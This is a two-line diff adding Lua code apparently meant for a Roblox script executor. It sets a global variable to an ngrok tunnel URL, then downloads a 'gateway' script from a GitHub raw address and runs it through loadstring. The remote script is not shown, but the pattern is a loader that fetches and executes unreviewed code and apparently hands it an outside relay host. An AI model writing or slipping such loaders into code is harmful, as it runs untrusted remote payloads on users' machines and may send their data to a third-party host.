@@ -1,1 +1,2 @@
-
+getgenv().r = "https://b47e-125-24-10-149.ngrok-free.app/"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ZoiIntra/Reviz/main/gateway'))()
